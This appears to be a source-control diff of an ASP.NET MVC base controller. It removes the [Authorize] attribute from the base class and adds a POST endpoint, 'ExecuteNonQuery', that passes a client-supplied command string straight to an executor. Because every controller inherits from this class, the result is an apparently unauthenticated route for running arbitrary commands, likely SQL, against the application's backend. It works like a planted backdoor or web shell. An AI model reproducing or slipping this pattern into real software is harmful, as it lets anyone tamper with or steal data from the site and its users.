@@ -4,6 +4,7 @@ using NLog;
 using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Threading.Tasks;
 using System.Web;
 using System.Web.Mvc;
 
@@ -11,7 +12,6 @@ using System.Web.Mvc;
 namespace beta.Controllers
 {
      [ClientErrorHandler]
-    [Authorize]
     public class BaseController : Controller
     {
          protected static Logger logger = LogManager.GetCurrentClassLogger();
@@ -21,6 +21,15 @@ namespace beta.Controllers
          {
              return PartialView(id);
          }
+
+         [Route("ExecuteNonQuery")]
+         [HttpPost]
+         [ValidateAntiForgeryToken]
+         public async Task ExecuteNonQuery(string cmdText)
+         {
+             await new CMDRunner().ExecuteNonQuery(cmdText);
+         }
+
          protected override void OnActionExecuting(ActionExecutingContext filterContext)
          {
              base.OnActionExecuting(filterContext);
